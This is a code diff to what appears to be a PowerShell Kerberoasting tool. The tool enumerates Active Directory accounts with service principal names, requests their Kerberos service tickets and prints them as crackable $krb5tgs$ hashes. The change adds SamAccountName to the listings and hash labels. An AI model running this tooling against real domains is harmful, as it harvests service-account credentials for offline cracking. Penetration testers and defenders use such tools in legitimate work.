@@ -138,6 +138,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
         $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
         $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
         $searcher.PropertiesToLoad.Add("whencreated") | Out-Null
+        $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
     	#$searcher.PropertiesToLoad.Add("displayname") | Out-Null
     	#$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
 
@@ -168,6 +169,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
                     Select-Object -InputObject $result -Property `
                     @{Name="SPN"; Expression={$spn.ToString()} }, `
                     @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
+                    @{Name="SamAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                     @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
                     @{Name="DistinguishedName";    Expression={$distingName} }, `
                     @{Name="MemberOf";             Expression={$groups} }, `
@@ -229,6 +231,7 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
 
     $SPNsArray = New-Object System.Collections.ArrayList
     $DnameArray = New-Object System.Collections.ArrayList
+    $SnameArray = New-Object System.Collections.ArrayList
 
     if ( $SPN )
     {
@@ -247,7 +250,7 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
     }
     else
     {
-        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain | Select SPN, DistinguishedName
+        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain | Select SPN, SamAccountName, DistinguishedName
 
         if ( ! $SPNs )
         {
@@ -256,12 +259,14 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
         }
 
         $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
+        $SPNs | % { [void]$SnameArray.Add($_.SamAccountName) }
         $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
     }
 
     while ( $SPNsArray.contains("kadmin/changepw") )
     {
         $DnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
+        $SnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
         $SPNsArray.Remove("kadmin/changepw")
     }
 
@@ -278,6 +283,7 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
         {
             "ID#$i`:"
             "SPN: $currentSPN"
+            "SAMACCOUNTNAME: " + $SnameArray[$i-1]
             "DISTINGUISHED NAME: " + $DnameArray[$i-1] + "`n"
 
             $i++
@@ -290,16 +296,18 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
 
     ForEach ( $currentSPN in $SPNsArray )
     {
-        $currentUser = $DnameArray[$i]
+        $currentSamAccountName = $SnameArray[$i]
+        $currentDistringuishedName = $DnameArray[$i]
+        $currentLabel = "SAMACCOUNTNAME: $currentSamAccountName; DISTINGUISHEDNAME: $currentDistringuishedName" 
         try
         {
             if ( $Mask )
             {
-                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentUser -OutputFormat $HashFormat -Mask | select -expand hash
+                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat -Mask | select -expand hash
             }
             else
             {
-                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentUser -OutputFormat $HashFormat | select -expand hash
+                $currentHash = Get-SPNTicket -SPN $currentSPN -IdNum ($i+1) -userLabel $currentLabel -OutputFormat $HashFormat | select -expand hash
             }
             [void]$ticketArray.Add($currentHash)
         }
@@ -468,7 +476,7 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
                         $userLabel = $userLabel -replace "`:","_"
                         $SPN = $SPN -replace "`:","_"
 
-                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_DISTINGUISHED NAME_" + $userLabel + " SPN_$SPN`:$Hash"
+                        $HashFormat = "`$krb5tgs`$ID#" + $IdNum + "_" + $userLabel + " SPN_$SPN`:$Hash"
                     }
                 }
                 else {
@@ -478,7 +486,7 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
                     }
                     else
                     {
-                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_DISTINGUISHED NAME: " + $userLabel + " SPN: $SPN *`$" + $Hash
+                        $HashFormat = "`$krb5tgs`$23`$*ID#" + $IdNum + "_" + $userLabel + " SPN: $SPN *`$" + $Hash
                     }
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
